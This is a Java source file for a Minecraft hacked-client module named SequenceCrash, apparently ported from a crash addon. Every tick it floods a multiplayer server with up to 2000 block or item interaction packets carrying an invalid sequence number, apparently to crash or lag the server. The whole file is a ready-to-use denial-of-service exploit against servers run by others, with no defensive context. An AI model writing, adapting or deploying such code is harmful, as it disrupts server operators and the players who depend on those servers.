// Ported from AntiCope/meteor-crash-addon (MIT License)
package thunder.hack.features.modules.crash;

import thunder.hack.features.modules.Module;
import thunder.hack.setting.Setting;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

public class SequenceCrash extends Module {
    private final Setting<Mode> mode = new Setting<>("Mode", Mode.Block);
    private final Setting<Integer> amount = new Setting<>("Amount", 200, 50, 2000);

    public SequenceCrash() {
        super("SequenceCrash", Category.CRASH);
    }

    @Override
    public void onUpdate() {
        if (mc.player == null) return;
        switch (mode.getValue()) {
            case Item -> {
                for (int i = 0; i < amount.getValue(); i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, -1, mc.player.getYaw(), mc.player.getPitch()));
                }
            }
            case Block -> {
                Vec3d pos = mc.player.getPos();
                BlockHitResult bhr = new BlockHitResult(pos, Direction.DOWN, BlockPos.ofFloored(pos), false);
                for (int i = 0; i < amount.getValue(); i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr, -1));
                }
            }
        }
    }

    public enum Mode {
        Item, Block
    }
}
